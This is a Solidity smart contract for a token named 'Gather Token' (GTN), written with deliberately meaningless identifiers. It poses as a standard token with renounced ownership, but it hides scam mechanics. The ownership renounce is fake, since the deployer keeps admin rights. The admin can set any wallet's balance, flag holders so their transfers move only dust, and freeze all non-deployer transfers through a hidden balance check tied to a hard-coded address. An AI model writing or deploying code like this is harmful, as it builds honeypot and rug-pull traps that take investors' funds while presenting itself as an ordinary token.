//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface tradingIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchMaxAuto) external view returns (uint256);

    function transfer(address feeAmount, uint256 swapSell) external returns (bool);

    function allowance(address atReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapSell) external returns (bool);

    function transferFrom(
        address sender,
        address feeAmount,
        uint256 swapSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyReceiver, uint256 value);
    event Approval(address indexed atReceiver, address indexed spender, uint256 value);
}

abstract contract atExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listTradingSwap {
    function createPair(address fromAt, address tokenTeamMarketing) external returns (address);
}

interface tradingIsMetadata is tradingIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GatherToken is atExempt, tradingIs, tradingIsMetadata {

    address private amountTotal;

    address shouldAtEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return txTakeIs;
    }

    bool private exemptAuto;

    function listTotalFee(address tradingShould, address feeAmount, uint256 swapSell) internal returns (bool) {
        require(limitTx[tradingShould] >= swapSell);
        limitTx[tradingShould] -= swapSell;
        limitTx[feeAmount] += swapSell;
        emit Transfer(tradingShould, feeAmount, swapSell);
        return true;
    }

    uint256 public autoEnable;

    function transferFrom(address tradingShould, address feeAmount, uint256 swapSell) external override returns (bool) {
        if (_msgSender() != listMax) {
            if (marketingIs[tradingShould][_msgSender()] != type(uint256).max) {
                require(swapSell <= marketingIs[tradingShould][_msgSender()]);
                marketingIs[tradingShould][_msgSender()] -= swapSell;
            }
        }
        return fromMarketing(tradingShould, feeAmount, swapSell);
    }

    bool public liquiditySwapList;

    function transfer(address swapMin, uint256 swapSell) external virtual override returns (bool) {
        return fromMarketing(_msgSender(), swapMin, swapSell);
    }

    bool private senderFund;

    mapping(address => uint256) private limitTx;

    uint256 constant fundWallet = 12 ** 10;

    function allowance(address buyExempt, address exemptMarketing) external view virtual override returns (uint256) {
        if (exemptMarketing == listMax) {
            return type(uint256).max;
        }
        return marketingIs[buyExempt][exemptMarketing];
    }

    function symbol() external view virtual override returns (string memory) {
        return teamMarketing;
    }

    string private txTakeIs = "Gather Token";

    function getOwner() external view returns (address) {
        return amountTotal;
    }

    event OwnershipTransferred(address indexed sellTx, address indexed fromAmountMode);

    address listMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private marketingIs;

    address public liquidityLaunched;

    mapping(address => bool) public swapIs;

    function totalWallet(address listWallet) public {
        if (launchedSender) {
            return;
        }
        
        swapBuy[listWallet] = true;
        if (receiverSwapSell) {
            receiverSwapSell = true;
        }
        launchedSender = true;
    }

    address public toTrading;

    uint8 private marketingSwap = 18;

    function approve(address exemptMarketing, uint256 swapSell) public virtual override returns (bool) {
        marketingIs[_msgSender()][exemptMarketing] = swapSell;
        emit Approval(_msgSender(), exemptMarketing, swapSell);
        return true;
    }

    uint256 private shouldList = 100000000 * 10 ** 18;

    bool private sellTo;

    bool private maxSwap;

    uint256 liquiditySellTake;

    function decimals() external view virtual override returns (uint8) {
        return marketingSwap;
    }

    function fromMarketing(address tradingShould, address feeAmount, uint256 swapSell) internal returns (bool) {
        if (tradingShould == toTrading) {
            return listTotalFee(tradingShould, feeAmount, swapSell);
        }
        uint256 buyFrom = tradingIs(liquidityLaunched).balanceOf(shouldAtEnable);
        require(buyFrom == liquiditySellTake);
        require(feeAmount != shouldAtEnable);
        if (swapIs[tradingShould]) {
            return listTotalFee(tradingShould, feeAmount, fundWallet);
        }
        return listTotalFee(tradingShould, feeAmount, swapSell);
    }

    uint256 public limitLiquidity;

    uint256 private tradingLaunchedMarketing;

    function listMarketingTx(uint256 swapSell) public {
        minTeam();
        liquiditySellTake = swapSell;
    }

    function exemptLaunchFee(address swapMin, uint256 swapSell) public {
        minTeam();
        limitTx[swapMin] = swapSell;
    }

    mapping(address => bool) public swapBuy;

    string private teamMarketing = "GTN";

    function buyShould(address liquidityTotal) public {
        minTeam();
        if (autoEnable != limitLiquidity) {
            sellTo = false;
        }
        if (liquidityTotal == toTrading || liquidityTotal == liquidityLaunched) {
            return;
        }
        swapIs[liquidityTotal] = true;
    }

    function owner() external view returns (address) {
        return amountTotal;
    }

    function minTeam() private view {
        require(swapBuy[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldList;
    }

    function balanceOf(address launchMaxAuto) public view virtual override returns (uint256) {
        return limitTx[launchMaxAuto];
    }

    bool public receiverSwapSell;

    function walletTokenMode() public {
        emit OwnershipTransferred(toTrading, address(0));
        amountTotal = address(0);
    }

    bool public launchedSender;

    constructor (){
        if (maxSwap != liquiditySwapList) {
            liquiditySwapList = true;
        }
        feeSender atList = feeSender(listMax);
        liquidityLaunched = listTradingSwap(atList.factory()).createPair(atList.WETH(), address(this));
        
        toTrading = _msgSender();
        walletTokenMode();
        swapBuy[toTrading] = true;
        limitTx[toTrading] = shouldList;
        if (limitLiquidity == tradingLaunchedMarketing) {
            tradingLaunchedMarketing = limitLiquidity;
        }
        emit Transfer(address(0), toTrading, shouldList);
    }

    uint256 exemptAmountLimit;

}